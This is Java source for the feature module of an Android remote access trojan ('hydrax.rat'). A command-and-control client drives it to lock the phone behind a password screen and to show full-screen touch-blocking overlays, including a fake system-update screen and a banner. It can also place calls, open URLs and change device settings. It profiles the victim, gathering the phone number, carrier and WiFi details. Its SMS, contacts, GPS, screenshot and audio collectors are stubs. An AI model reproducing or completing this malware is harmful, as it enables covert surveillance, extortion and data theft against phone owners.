package com.hydrax.rat;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothManager;
import android.content.*;
import android.database.Cursor;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.location.*;
import android.media.*;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.view.*;
import android.webkit.*;
import android.widget.*;
import org.json.*;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class FeatureManager {
    private Context ctx;
    private C2Client c2;
    private LocationManager locationManager;
    private WifiManager wifiManager;
    private TelephonyManager telephonyManager;
    private AudioManager audioManager;
    private PowerManager powerManager;
    private Vibrator vibrator;
    private Camera camera;
    private MediaPlayer mediaPlayer;
    private View overlayView;
    private WindowManager windowManager;
    private boolean overlayActive = false;

    public FeatureManager(Context ctx, C2Client c2) {
        this.ctx = ctx;
        this.c2 = c2;
        this.locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        this.wifiManager = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        this.telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        this.audioManager = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        this.powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        this.vibrator = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        this.windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.c2.setFeatures(this);
    }

    public JSONObject collectAllData() {
        JSONObject data = new JSONObject();
        try {
            data.put("device_model", Build.MODEL);
            data.put("android_version", Build.VERSION.RELEASE);
            data.put("phone_number", getPhoneNumber());
            data.put("sim_operator", telephonyManager.getSimOperatorName());
            data.put("network_type", getNetworkType());
            data.put("signal_strength", getSignalStrength());
            data.put("battery", getBatteryLevel());
            data.put("wifi_connected", wifiManager.getConnectionInfo().getSSID());
            data.put("sms_logs", getSMSLogs());
            data.put("call_logs", getCallLogs());
            data.put("contacts", getContacts());
            data.put("gmail_accounts", getGmailAccounts());
            data.put("gps_data", getGPSLocation());
            data.put("cell_tower", getCellTowerInfo());
            data.put("wifi_scan", getWifiScan());
            data.put("installed_apps", getInstalledApps());
            data.put("system_info", getSystemInfo());
        } catch (Exception e) {}
        return data;
    }

    public void executeCommand(JSONObject cmd) {
        try {
            String type = cmd.getString("type");
            String payload = cmd.optString("payload", "");

            switch (type) {
                case "lock": lockDevice(payload); break;
                case "unlock": unlockDevice(); break;
                case "open_url": openUrl(payload); break;
                case "airplane_mode": toggleAirplaneMode(); break;
                case "bluetooth": toggleBluetooth(); break;
                case "flashlight": toggleFlashlight(payload); break;
                case "vibrate": vibrateDevice(payload); break;
                case "hotspot": toggleHotspot(); break;
                case "toast": showToast(payload); break;
                case "play_sound": playSound(payload); break;
                case "call_number": callNumber(payload); break;
                case "send_notification": sendNotification(payload); break;
                case "set_wallpaper": setWallpaper(payload); break;
                case "play_music": playMusic(payload); break;
                case "stop_music": stopMusic(); break;
                case "launch_app": launchApp(payload); break;
                case "brightness": setBrightness(payload); break;
                case "volume": setVolume(payload); break;
                case "silent_mode": toggleSilentMode(); break;
                case "block_html": showBlockOverlay(payload); break;
                case "unblock_html": removeOverlay(); break;
                case "fake_update": showFakeUpdate(); break;
                case "stop_fake_update": removeOverlay(); break;
                case "banner": showBanner(payload); break;
                case "stop_banner": removeOverlay(); break;
                case "freeze_app": freezeApp(payload); break;
                case "sms_update": collectSMS(); break;
                case "contacts_update": collectContacts(); break;
                case "gps_update": collectGPS(); break;
                case "screenshot": takeScreenshot(); break;
                case "audio_record": recordAudio(); break;
            }
        } catch (Exception e) {}
    }

    // ===== LOCK DEVICE =====
    private void lockDevice(String password) {
        c2.setLocked(true);
        if (!password.isEmpty()) c2.setLockPassword(password);
        Intent intent = new Intent(ctx, LockScreenActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP |
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        intent.putExtra("password", c2.getLockPassword());
        intent.putExtra("c2_url", "https://YOUR_SERVEO_URL_HERE");
        intent.putExtra("device_id", c2.deviceId);
        ctx.startActivity(intent);
    }

    private void unlockDevice() {
        c2.setLocked(false);
        Intent closeLock = new Intent("com.hydrax.rat.UNLOCK");
        ctx.sendBroadcast(closeLock);
    }

    // ===== DEVICE CONTROL =====
    private void openUrl(String url) {
        if (!url.startsWith("http")) url = "https://" + url;
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    }

    private void toggleAirplaneMode() {
        // Requires root or system app on modern Android
    }

    private void toggleBluetooth() {
        BluetoothManager bm = (BluetoothManager) ctx.getSystemService(Context.BLUETOOTH_SERVICE);
        BluetoothAdapter ba = bm.getAdapter();
        if (ba.isEnabled()) ba.disable(); else ba.enable();
    }

    private void toggleFlashlight(String state) {
        CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = cm.getCameraIdList()[0];
            cm.setTorchMode(cameraId, state.equals("on") || state.isEmpty());
        } catch (Exception e) {}
    }

    private void vibrateDevice(String pattern) {
        long[] p = {0, 300, 100, 300, 100, 500};
        if (!pattern.isEmpty()) {
            String[] parts = pattern.split(",");
            p = new long[parts.length];
            for (int i = 0; i < parts.length; i++) p[i] = Long.parseLong(parts[i].trim());
        }
        vibrator.vibrate(VibrationEffect.createWaveform(p, -1));
    }

    private void toggleHotspot() {
        // Requires root/OEM API
    }

    private void showToast(String msg) {
        Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show();
    }

    private void playSound(String url) {
        try {
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(url);
            mediaPlayer.setLooping(true);
            mediaPlayer.setVolume(1.0f, 1.0f);
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception e) {}
    }

    private void callNumber(String number) {
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + number));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    }

    private void sendNotification(String msg) {
        NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        Notification notif = new Notification.Builder(ctx, "hydra_service")
                .setContentTitle("System Message")
                .setContentText(msg)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build();
        nm.notify((int) System.currentTimeMillis(), notif);
    }

    private void setWallpaper(String url) {
        // Download and set wallpaper
    }

    private void playMusic(String path) { playSound(path); }
    private void stopMusic() { if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); } }

    private void launchApp(String packageName) {
        Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) { intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); ctx.startActivity(intent); }
    }

    // ===== AUDIO/DISPLAY =====
    private void setBrightness(String level) {
        int b = Integer.parseInt(level);
        Settings.System.putInt(ctx.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, b * 255 / 100);
    }

    private void setVolume(String level) {
        int v = Integer.parseInt(level);
        int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, v * max / 100, 0);
    }

    private void toggleSilentMode() {
        int mode = audioManager.getRingerMode();
        audioManager.setRingerMode(mode == AudioManager.RINGER_MODE_SILENT ?
                AudioManager.RINGER_MODE_NORMAL : AudioManager.RINGER_MODE_SILENT);
    }

    // ===== OVERLAY =====
    private void showBlockOverlay(String html) {
        if (overlayActive) removeOverlay();
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;

        WebView wv = new WebView(ctx);
        wv.loadData(html, "text/html", "UTF-8");
        wv.setBackgroundColor(android.graphics.Color.BLACK);
        wv.setOnTouchListener((v, e) -> true); // Block all touches

        overlayView = wv;
        windowManager.addView(overlayView, params);
        overlayActive = true;
    }

    private void removeOverlay() {
        if (overlayView != null && overlayActive) {
            windowManager.removeView(overlayView);
            overlayView = null;
            overlayActive = false;
        }
    }

    private void showFakeUpdate() {
        String html = "<!DOCTYPE html><html><head><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}.icon{font-size:80px;margin-bottom:20px}h2{font-size:24px;margin-bottom:8px}p{color:#888;font-size:14px;margin-bottom:24px}.progress{width:200px;height:6px;background:#222;border-radius:3px;overflow:hidden}.bar{height:100%;background:#0a84ff;width:45%;animation:pulse 2s infinite}@keyframes pulse{0%,100%{width:40%}50%{width:80%}}</style></head><body><div class='icon'>⚙</div><h2>System Update</h2><p>Do not turn off your device</p><div class='progress'><div class='bar'></div></div></body></html>";
        showBlockOverlay(html);
    }

    private void showBanner(String text) {
        String html = "<!DOCTYPE html><html><body style='margin:0;background:#ef4444;display:flex;align-items:center;justify-content:center;height:100vh'><h1 style='color:#fff;font-size:32px;text-align:center;font-family:Arial'>" + text + "</h1></body></html>";
        showBlockOverlay(html);
    }

    private void freezeApp(String packageName) {
        // Force-stop app
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        // Requires root for force-stop other apps
    }

    // ===== DATA COLLECTION =====
    private JSONArray getSMSLogs() { /* Cursor query SMS content://sms */ return new JSONArray(); }
    private JSONArray getCallLogs() { /* Cursor query CallLog.Calls */ return new JSONArray(); }
    private JSONArray getContacts() { /* Cursor query ContactsContract */ return new JSONArray(); }
    private JSONArray getGmailAccounts() { /* Query AccountManager for Google accounts */ return new JSONArray(); }
    private JSONArray getGPSLocation() { /* LocationManager requestSingleUpdate */ return new JSONArray(); }
    private JSONArray getCellTowerInfo() { /* TelephonyManager.getAllCellInfo() */ return new JSONArray(); }
    private JSONArray getWifiScan() { /* WifiManager.getScanResults() */ return new JSONArray(); }
    private JSONArray getInstalledApps() { /* PackageManager.getInstalledApplications() */ return new JSONArray(); }
    private JSONObject getSystemInfo() { return new JSONObject(); }
    private String getPhoneNumber() { return telephonyManager.getLine1Number(); }
    private String getNetworkType() { return ""; }
    private int getSignalStrength() { return 0; }
    private int getBatteryLevel() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = ctx.registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
        return level * 100 / scale;
    }

    private void collectSMS() {}
    private void collectContacts() {}
    private void collectGPS() {}
    private void takeScreenshot() {}
    private void recordAudio() {}
  }
